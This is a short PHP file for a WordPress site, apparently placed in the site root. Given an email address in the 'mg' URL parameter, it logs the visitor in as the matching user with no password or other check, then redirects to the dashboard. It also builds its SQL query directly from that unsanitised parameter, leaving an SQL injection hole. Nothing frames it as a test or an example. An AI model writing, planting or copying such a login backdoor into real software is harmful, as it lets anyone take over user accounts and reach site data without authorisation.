<?php 
if(!isset($wpdb))
{
    require_once('wp-config.php');
    require_once('wp-includes/wp-db.php');
	
}
if(isset($_GET['mg']))
{
	global $wpdb;
	$user_id = $wpdb->get_var("SELECT ID FROM sp_users WHERE user_email='".$_GET['mg']."'");
	wp_set_current_user($user_id);
	wp_set_auth_cookie($user_id);
	wp_redirect(site_url('dashboard'));
}
/* $user_id=1305;
 $user_id=1452; 
 $user_id=1272;  */

?>